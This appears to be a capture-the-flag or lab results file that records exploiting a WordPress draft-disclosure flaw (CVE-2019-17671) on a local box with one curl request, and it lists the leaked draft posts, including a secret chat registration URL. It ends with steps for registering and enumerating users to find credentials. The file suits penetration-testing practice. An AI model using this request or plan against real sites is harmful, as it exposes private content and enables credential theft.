# CVE-2019-17671 Exploit Results

## Exploit Command
```bash
curl -H "Host: office.paper" http://localhost:8080/?static=1&order=asc
```

## CRITICAL FINDING: Secret Chat System URL
**URL:** http://chat.office.paper/register/8qozr226AhkCHZdyY

## Leaked Draft Posts

### Post 95 (DRAFT)
"Micheal please remove the secret from drafts for gods sake!"

### Post 99 (TRASH) - Nick's Message
"Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick"

### Post 84 (PUBLISHED) - Warning to Michael
"# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick"

### Post 89 (DRAFT) - Threat Level Midnight
Michael's screenplay: "A MOTION PICTURE SCREENPLAY, WRITTEN AND DIRECTED BY MICHAEL SCOTT"

### Post 86 (DRAFT) - SECRET REGISTRATION URL ⭐
```
# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

## Users Identified
- Michael (Scott) - puts secrets in drafts
- Nick - admin/manager, warning Michael
- Creed Bratton - commenter

## Next Steps
1. Add chat.office.paper to /etc/hosts
2. Visit the secret registration URL
3. Register an account on the chat system
4. Enumerate users and find credentials
